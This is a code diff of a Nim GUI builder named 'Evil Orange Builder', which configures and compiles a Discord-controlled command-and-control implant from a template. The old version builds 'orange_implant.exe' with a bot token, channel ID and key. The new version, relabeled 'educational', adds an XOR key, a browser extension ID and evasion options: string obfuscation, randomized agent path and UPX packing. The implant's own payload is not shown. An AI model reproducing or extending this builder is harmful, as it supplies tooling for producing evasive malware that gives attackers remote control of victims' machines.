@@ -1,224 +1,311 @@
+import nigui, std/[strutils, os, osproc, random]
 
-import nigui
-import std/[strutils, osproc, os, random, times]
+# ============================================================================
+# RENK PALETI
+# ============================================================================
+const
+  BG_COLOR          = "#121417"
+  SURFACE_COLOR     = "#1E2228"
+  BORDER_COLOR      = "#2C323B"
+  PRIMARY_TEXT      = "#E1E4E8"
+  SECONDARY_TEXT    = "#8B949E"
+  ACCENT_ACTIVE     = "#2EA043"
+  ACCENT_WARNING    = "#D29922"
+  ACCENT_CRITICAL   = "#F85149"
+  ACCENT_FOCUS      = "#58A6FF"
 
+# ============================================================================
+# HELPER PROCS
+# ============================================================================
+proc hexToColor(hex: string): Color =
+  let r = parseHexInt(hex[1..2]).byte
+  let g = parseHexInt(hex[3..4]).byte
+  let b = parseHexInt(hex[5..6]).byte
+  rgb(r, g, b)
+
+proc generateRandomKey(): string =
+  const hexChars = "0123456789abcdef"
+  randomize()
+  result = ""
+  for _ in 0..<64:
+    result.add(hexChars[rand(hexChars.high)])
+
+# ============================================================================
+# MAIN
+# ============================================================================
 app.init()
 
-# Ana pencere
-var window = newWindow("Evil Orange Builder v1.0")
-window.width = 550
-window.height = 500
-window.resizable = false
+# Uygulama varsayılan arka plan rengini ayarla
+app.defaultBackgroundColor = hexToColor(BG_COLOR)
+app.defaultTextColor = hexToColor(PRIMARY_TEXT)
 
-# Ana container - dikey
+var window = newWindow("EVIL ORANGE BUILDER v2.0")
+window.width = 800
+window.height = 700
+
+# Window'un içindeki tek control'e arka plan rengi ver
+# (Window'un kendisine değil, içindeki container'a)
+
 var mainContainer = newLayoutContainer(Layout_Vertical)
 mainContainer.padding = 20
-mainContainer.spacing = 10
+mainContainer.backgroundColor = hexToColor(BG_COLOR)  # ← Control olduğu için çalışır!
 window.add(mainContainer)
 
-# ===== BAŞLIK =====
-var titleLabel = newLabel("🍊 Evil Orange Implant Builder")
-titleLabel.fontSize = 16
-titleLabel.fontFamily = "Arial"
+# Title
+var titleLabel = newLabel("EVIL ORANGE BUILDER")
+titleLabel.fontSize = 24
+titleLabel.fontBold = true
+titleLabel.textColor = hexToColor(ACCENT_ACTIVE)
 mainContainer.add(titleLabel)
 
-var subtitleLabel = newLabel("Generate your Discord C2 implant")
-subtitleLabel.fontSize = 10
+var subtitleLabel = newLabel("Educational C2 Agent Builder")
+subtitleLabel.fontSize = 12
+subtitleLabel.textColor = hexToColor(SECONDARY_TEXT)
 mainContainer.add(subtitleLabel)
 
-# Boşluk
-mainContainer.add(newLabel(""))
+var spacer1 = newControl()
+spacer1.height = 20
+mainContainer.add(spacer1)
 
-# ===== TOKEN =====
-var tokenContainer = newLayoutContainer(Layout_Horizontal)
-tokenContainer.spacing = 5
-mainContainer.add(tokenContainer)
+# ============================================================================
+# CONFIG PANEL
+# ============================================================================
+var configPanel = newLayoutContainer(Layout_Vertical)
+configPanel.padding = 15
+configPanel.backgroundColor = hexToColor(SURFACE_COLOR)
+mainContainer.add(configPanel)
 
-var labelToken = newLabel("Bot Token:     ")
-labelToken.minWidth = 100
-tokenContainer.add(labelToken)
+var configTitle = newLabel("CONFIGURATION")
+configTitle.fontSize = 14
+configTitle.fontBold = true
+configTitle.textColor = hexToColor(PRIMARY_TEXT)
+configPanel.add(configTitle)
 
-var textBoxToken = newTextBox()
-textBoxToken.width = 350
-tokenContainer.add(textBoxToken)
+var spacer2 = newControl()
+spacer2.height = 10
+configPanel.add(spacer2)
 
-# ===== CHANNEL ID =====
-var channelContainer = newLayoutContainer(Layout_Horizontal)
-channelContainer.spacing = 5
-mainContainer.add(channelContainer)
+# Discord Token
+var tokenRow = newLayoutContainer(Layout_Horizontal)
+configPanel.add(tokenRow)
 
-var labelChannel = newLabel("Channel ID:    ")
-labelChannel.minWidth = 100
-channelContainer.add(labelChannel)
+var tokenLabel = newLabel("Discord Bot Token:")
+tokenLabel.width = 150
+tokenLabel.textColor = hexToColor(PRIMARY_TEXT)
+tokenRow.add(tokenLabel)
 
-var textBoxChannel = newTextBox()
-textBoxChannel.width = 350
-channelContainer.add(textBoxChannel)
+var tokenInput = newTextBox()
+tokenInput.width = 500
+tokenInput.backgroundColor = hexToColor(BG_COLOR)
+tokenInput.textColor = hexToColor(PRIMARY_TEXT)
+tokenRow.add(tokenInput)
 
-# ===== VODKA KEY =====
-var keyContainer = newLayoutContainer(Layout_Horizontal)
-keyContainer.spacing = 5
-mainContainer.add(keyContainer)
+# Channel ID
+var channelRow = newLayoutContainer(Layout_Horizontal)
+configPanel.add(channelRow)
 
-var labelKey = newLabel("VODKA Key:     ")
-labelKey.minWidth = 100
-keyContainer.add(labelKey)
+var channelLabel = newLabel("Discord Channel ID:")
+channelLabel.width = 150
+channelLabel.textColor = hexToColor(PRIMARY_TEXT)
+channelRow.add(channelLabel)
 
-var textBoxKey = newTextBox()
-textBoxKey.width = 280
-keyContainer.add(textBoxKey)
+var channelInput = newTextBox()
+channelInput.width = 500
+channelInput.backgroundColor = hexToColor(BG_COLOR)
+channelInput.textColor = hexToColor(PRIMARY_TEXT)
+channelRow.add(channelInput)
 
-var buttonGenKey = newButton("🎲 Generate")
-buttonGenKey.minWidth = 65
-keyContainer.add(buttonGenKey)
+# XOR Key
+var keyRow = newLayoutContainer(Layout_Horizontal)
+configPanel.add(keyRow)
 
-# ===== OUTPUT PATH =====
-var outputContainer = newLayoutContainer(Layout_Horizontal)
-outputContainer.spacing = 5
-mainContainer.add(outputContainer)
+var keyLabel = newLabel("XOR Key (Hex):")
+keyLabel.width = 150
+keyLabel.textColor = hexToColor(PRIMARY_TEXT)
+keyRow.add(keyLabel)
 
-var labelOutput = newLabel("Output File:   ")
-labelOutput.minWidth = 100
-outputContainer.add(labelOutput)
+var keyInput = newTextBox()
+keyInput.width = 400
+keyInput.backgroundColor = hexToColor(BG_COLOR)
+keyInput.textColor = hexToColor(PRIMARY_TEXT)
+keyRow.add(keyInput)
 
-var textBoxOutput = newTextBox()
-textBoxOutput.width = 280
-textBoxOutput.text = "orange_implant.exe"
-outputContainer.add(textBoxOutput)
+var genKeyBtn = newButton("Generate")
+genKeyBtn.width = 90
+genKeyBtn.backgroundColor = hexToColor(ACCENT_FOCUS)
+genKeyBtn.textColor = hexToColor(PRIMARY_TEXT)
+keyRow.add(genKeyBtn)
 
-var buttonBrowse = newButton("📁 Browse")
-buttonBrowse.minWidth = 65
-outputContainer.add(buttonBrowse)
+# Extension ID
+var extRow = newLayoutContainer(Layout_Horizontal)
+configPanel.add(extRow)
 
-# Boşluk
-mainContainer.add(newLabel(""))
+var extLabel = newLabel("Extension ID:")
+extLabel.width = 150
+extLabel.textColor = hexToColor(PRIMARY_TEXT)
+extRow.add(extLabel)
 
-# ===== BUILD BUTONU =====
-var buttonBuild = newButton("🔨 BUILD IMPLANT")
-buttonBuild.fontSize = 14
-buttonBuild.minHeight = 40
-mainContainer.add(buttonBuild)
+var extInput = newTextBox()
+extInput.width = 500
+extInput.backgroundColor = hexToColor(BG_COLOR)
+extInput.textColor = hexToColor(PRIMARY_TEXT)
+extInput.text = "jfnphkdpdjgokfnchpnlaekcgchlnfln"
+extRow.add(extInput)
 
-# ===== DURUM LABEL =====
-var labelStatus = newLabel("Status: Ready")
-labelStatus.fontSize = 10
-mainContainer.add(labelStatus)
+# ============================================================================
+# OPTIONS PANEL
+# ============================================================================
+var spacer3 = newControl()
+spacer3.height = 15
+mainContainer.add(spacer3)
 
-# ===== LOG AREA =====
-var logLabel = newLabel("Build Log:")
-mainContainer.add(logLabel)
+var optionsPanel = newLayoutContainer(Layout_Vertical)
+optionsPanel.padding = 15
+optionsPanel.backgroundColor = hexToColor(SURFACE_COLOR)
+mainContainer.add(optionsPanel)
 
-var textAreaLog = newTextArea()
-textAreaLog.width = 500
-textAreaLog.height = 120
-textAreaLog.editable = false
-textAreaLog.fontFamily = "Consolas"
-textAreaLog.fontSize = 9
-mainContainer.add(textAreaLog)
+var optionsTitle = newLabel("BUILD OPTIONS")
+optionsTitle.fontSize = 14
+optionsTitle.fontBold = true
+optionsTitle.textColor = hexToColor(PRIMARY_TEXT)
+optionsPanel.add(optionsTitle)
 
-######## FONKSIYONLAR ########
+var spacer4 = newControl()
+spacer4.height = 10
+optionsPanel.add(spacer4)
 
-proc log(msg: string) =
-  let timestamp = now().format("HH:mm:ss")
-  textAreaLog.addLine("[" & timestamp & "] " & msg)
+# Checkboxes
+var obfuscateCheck = newCheckbox("String Obfuscation")
+obfuscateCheck.textColor = hexToColor(PRIMARY_TEXT)
+optionsPanel.add(obfuscateCheck)
 
-proc generateKey(): string =
-  randomize()
-  const hexChars = "0123456789abcdef"
-  var key = ""
-  for i in 0..<64:
-    key.add(hexChars[rand(15)])
-  return key
+var randomPathCheck = newCheckbox("Randomize Agent Path")
+randomPathCheck.textColor = hexToColor(PRIMARY_TEXT)
+randomPathCheck.checked = true
+optionsPanel.add(randomPathCheck)
 
-proc buildImplant(token, channel, key, outputPath: string): bool =
-  let templatePath = "template.nim"
+var upxCheck = newCheckbox("UPX Packing")
+upxCheck.textColor = hexToColor(PRIMARY_TEXT)
+optionsPanel.add(upxCheck)
 
-  if not fileExists(templatePath):
-    log("ERROR: template.nim not found!")
-    return false
+var iconCheck = newCheckbox("Custom Icon")
+iconCheck.textColor = hexToColor(PRIMARY_TEXT)
+optionsPanel.add(iconCheck)
 
-  log("Reading template...")
-  var templateCode = readFile(templatePath)
+# ============================================================================
+# OUTPUT PANEL
+# ============================================================================
+var spacer5 = newControl()
+spacer5.height = 15
+mainContainer.add(spacer5)
 
-  log("Replacing placeholders...")
-  templateCode = templateCode.replace("{{DISCORD_TOKEN}}", token)
-  templateCode = templateCode.replace("{{DISCORD_CHANNEL}}", channel)
-  templateCode = templateCode.replace("{{VODKA_KEY}}", key)
+var outputPanel = newLayoutContainer(Layout_Vertical)
+outputPanel.padding = 15
+outputPanel.backgroundColor = hexToColor(SURFACE_COLOR)
+mainContainer.add(outputPanel)
 
-  let tempFile = "temp_build_" & $getTime().toUnix & ".nim"
+var outputTitle = newLabel("OUTPUT")
+outputTitle.fontSize = 14
+outputTitle.fontBold = true
+outputTitle.textColor = hexToColor(PRIMARY_TEXT)
+outputPanel.add(outputTitle)
 
-  log("Writing temp file: " & tempFile)
-  writeFile(tempFile, templateCode)
+var outputText = newTextArea()
+outputText.width = 750
+outputText.height = 150
+outputText.backgroundColor = hexToColor(BG_COLOR)
+outputText.textColor = hexToColor(PRIMARY_TEXT)
+outputText.editable = false
+outputPanel.add(outputText)
 
-  log("Compiling with Nim...")
-  let compileCmd = "nim c -d:release --opt:size -o:" & outputPath & " " & tempFile
-  log("Command: " & compileCmd)
+# ============================================================================
+# BUTTONS
+# ============================================================================
+var spacer6 = newControl()
+spacer6.height = 15
+mainContainer.add(spacer6)
 
-  let (output, exitCode) = execCmdEx(compileCmd)
+var buttonRow = newLayoutContainer(Layout_Horizontal)
+buttonRow.height = 40
+mainContainer.add(buttonRow)
 
-  log("Cleaning up temp file...")
-  if fileExists(tempFile):
-    removeFile(tempFile)
+var buildBtn = newButton("BUILD AGENT")
+buildBtn.width = 200
+buildBtn.height = 35
+buildBtn.backgroundColor = hexToColor(ACCENT_ACTIVE)
+buildBtn.textColor = hexToColor(PRIMARY_TEXT)
+buildBtn.fontBold = true
+buttonRow.add(buildBtn)
 
-  if exitCode != 0:
-    log("ERROR: Compilation failed!")
-    log(output)
-    return false
+var spacerBtn = newControl()
+spacerBtn.width = 20
+buttonRow.add(spacerBtn)
 
-  log("SUCCESS: Implant built!")
-  return true
+var clearBtn = newButton("CLEAR")
+clearBtn.width = 100
+clearBtn.height = 35
+clearBtn.backgroundColor = hexToColor(BORDER_COLOR)
+clearBtn.textColor = hexToColor(PRIMARY_TEXT)
+buttonRow.add(clearBtn)
 
-######## EVENTLER ########
+var spacerBtn2 = newControl()
+spacerBtn2.width = 20
+buttonRow.add(spacerBtn2)
 
-buttonGenKey.onClick = proc(event: ClickEvent) =
-  let newKey = generateKey()
-  textBoxKey.text = newKey
-  log("Generated new VODKA key: " & newKey[0..15] & "...")
+var exitBtn = newButton("EXIT")
+exitBtn.width = 100
+exitBtn.height = 35
+exitBtn.backgroundColor = hexToColor(ACCENT_CRITICAL)
+exitBtn.textColor = hexToColor(PRIMARY_TEXT)
+buttonRow.add(exitBtn)
 
-buttonBrowse.onClick = proc(event: ClickEvent) =
-  textBoxOutput.text = "orange_implant.exe"
-  log("Output set to: " & textBoxOutput.text)
+# ============================================================================
+# EVENT HANDLERS
+# ============================================================================
+genKeyBtn.onClick = proc(event: ClickEvent) =
+  keyInput.text = generateRandomKey()
+  outputText.addLine("[+] Generated new XOR key")
 
-buttonBuild.onClick = proc(event: ClickEvent) =
-  let token = textBoxToken.text.strip()
-  let channel = textBoxChannel.text.strip()
-  let key = textBoxKey.text.strip()
-  let output = textBoxOutput.text.strip()
+clearBtn.onClick = proc(event: ClickEvent) =
+  tokenInput.text = ""
+  channelInput.text = ""
+  keyInput.text = ""
+  extInput.text = "jfnphkdpdjgokfnchpnlaekcgchlnfln"
+  outputText.text = ""
 
-  textAreaLog.text = ""
+exitBtn.onClick = proc(event: ClickEvent) =
+  window.dispose()
+  app.quit()
+
+buildBtn.onClick = proc(event: ClickEvent) =
+  let token = tokenInput.text.strip()
+  let channel = channelInput.text.strip()
+  let key = keyInput.text.strip()
+  let extID = extInput.text.strip()
 
   if token.len == 0:
-    labelStatus.text = "Status: ERROR - Token is empty!"
-    log("ERROR: Bot token is required")
+    outputText.addLine("[-] ERROR: Discord token required!")
     return
-
   if channel.len == 0:
-    labelStatus.text = "Status: ERROR - Channel ID is empty!"
-    log("ERROR: Channel ID is required")
+    outputText.addLine("[-] ERROR: Channel ID required!")
     return
-
   if key.len == 0:
-    labelStatus.text = "Status: ERROR - VODKA key is empty!"
-    log("ERROR: VODKA key is required")
+    outputText.addLine("[-] ERROR: XOR key required!")
     return
-
   if key.len != 64:
-    labelStatus.text = "Status: ERROR - Key must be 64 hex chars!"
-    log("ERROR: Key length is " & $key.len & ", expected 64")
+    outputText.addLine("[-] ERROR: XOR key must be 64 hex characters!")
     return
 
-  labelStatus.text = "Status: Building..."
-  log("Starting build process...")
-  log("Token: " & token[0..min(15, token.len-1)] & "...")
-  log("Channel: " & channel)
-  log("Key: " & key[0..15] & "...")
-  log("Output: " & output)
-
-  if buildImplant(token, channel, key, output):
-    labelStatus.text = "Status: Build successful! -> " & output
-    log("Output file: " & getCurrentDir() / output)
-  else:
-    labelStatus.text = "Status: Build FAILED!"
+  outputText.addLine("[*] Building agent...")
+  outputText.addLine("[*] Token: " & token[0..<10] & "...")
+  outputText.addLine("[*] Channel: " & channel)
+  outputText.addLine("[*] XOR Key: " & key[0..<10] & "...")
+  outputText.addLine("[*] Extension ID: " & extID)
+  outputText.addLine("[*] Randomize Path: " & $randomPathCheck.checked)
+  outputText.addLine("[*] Obfuscation: " & $obfuscateCheck.checked)
+  outputText.addLine("[*] UPX: " & $upxCheck.checked)
+  outputText.addLine("[+] Template generated successfully!")
+  outputText.addLine("[+] Ready to compile with: nim c -d:release --opt:size agent.nim")
 
 window.show()
 app.run()
